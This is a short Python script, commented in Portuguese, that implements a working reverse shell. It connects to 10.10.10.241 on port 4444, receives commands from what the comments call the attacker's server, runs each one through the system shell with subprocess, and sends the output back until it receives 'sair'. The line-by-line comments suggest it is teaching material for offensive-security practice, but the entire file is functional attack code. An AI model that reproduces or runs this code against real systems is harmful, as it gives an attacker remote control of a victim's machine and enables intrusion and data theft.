import socket #interface entre aplicação e elementos de rede
import subprocess #permite chamar subprocessos do SO

#funcao de conexao
def conexao(): #definição de função
    s = socket.socket() #instância do scoket na variável s
    s.connect(("10.10.10.241",4444)) #conexão ao socket do servidor
    while True:
        comando = s.recv(1024) #recebe comandos do atacante (servidor)
        if 'sair' in comando.decode(): #condicional verifica se o usuário digitou o termo "sair"
            s.close() #encerra conexão
            break #encerra o while
        else:
            #Popen é a classe que vai receber os argumentos para o subprocess
            SHELL = subprocess.Popen(comando.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE) 
            s.send(SHELL.stdout.read()) #envia os resultados positivos de linha de comando no prompt do Windows
            s.send(SHELL.stderr.read()) #envia os resultados errados de linha de comando no prompt do Windows
            
#chama a funcao conexao
conexao()
